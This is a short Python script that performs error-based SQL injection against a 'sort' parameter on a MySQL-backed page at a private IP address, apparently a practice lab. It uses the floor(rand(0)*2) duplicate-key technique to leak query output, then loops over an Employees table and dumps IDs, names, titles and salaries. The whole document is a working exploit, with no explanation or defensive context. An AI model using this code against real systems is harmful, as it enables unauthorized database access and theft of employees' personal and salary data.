import requests

def httpreq(query):
    header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
          "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

    delims = "!~!~!"

# http://192.168.106.129/mysql_sort.php?sort=(select+1+from+(select+count(*),concat("!~!~!",version(),"!~!~!",floor(rand(0)*2))a+from+information_schema.tables+group+by+a)T)%23

    address = "http://192.168.106.129/mysql_sort.php?sort=(select+1+from+(select+count(*),concat('" + delims + \
              "'," + query + ",'" + delims + \
              "',floor(rand(0)*2))a+from+information_schema.tables+group+by+a)T)%23"
    response = requests.get(address, headers=header)
    #print(response.text)
    return response.text.split(delims)[1]

rcount = "(select count(*) from Employees)"
cnt = int(httpreq(rcount))
print("cnt : " + str(cnt))

for i in range(0, cnt):
    tname = "(select concat_ws(0x2c,EmployeeID, FirstName,Title,Salary) from Employees limit 1 OFFSET " + str(i) + ")"
    print("colmun " + str(i+1) + " : " + httpreq(tname))
